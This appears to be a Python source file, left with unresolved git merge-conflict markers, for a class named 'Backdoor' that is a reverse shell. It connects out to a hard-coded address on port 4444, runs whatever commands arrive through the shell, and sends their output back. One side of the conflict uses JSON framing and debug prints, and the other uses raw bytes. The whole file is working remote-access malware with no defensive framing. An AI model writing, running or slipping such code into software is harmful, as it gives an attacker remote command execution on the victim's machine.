<<<<<<< HEAD
import subprocess, sys, socket, json
=======
import subprocess, sys, socket
>>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d


class Backdoor:
    def __init__(self,ip,port):
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.s.connect((str(ip),port))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def executeCmd(self,cmd):
        cmd = subprocess.check_output(cmd,shell=True)
        return cmd
<<<<<<< HEAD
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.s.send(str(jsData).encode('utf-8'))


    def recvStream(self):
        jsData = self.s.recv(1024)
        return json.loads(jsData)
=======
>>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d


    def run(self):
        while True:
<<<<<<< HEAD
            print('run1')
            cmdIn = self.recvStream()
            print(cmdIn)
            print('run1')
            #cmdIn = cmdIn.decode()
            #print(cmdIn)
            try:
                print('run3_TRY')
                cmdOut = self.executeCmd(cmdIn)
                print('run4_TRY')
                print(cmdOut)
                cmdOut = cmdOut.decode('utf-8')
                print(cmdOut)
                self.sendStream(cmdOut)
                print('run5_TRYPOSTSEND')
            except subprocess.CalledProcessError:
                self.sendStream('Subprocess Error, shell command not accepted by target')
=======
            cmdIn = self.s.recv(1024)
            cmdIn = cmdIn.decode()
            #print(cmdIn)
            try:
                cmdOut = self.executeCmd(cmdIn)
                self.s.send(str(cmdOut).encode('utf-8'))
            except subprocess.CalledProcessError:
                self.s.send(b'Subprocess Error, shell command not accepted by target')
>>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d


backdoor = Backdoor('10.211.55.5',4444)


try:
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()

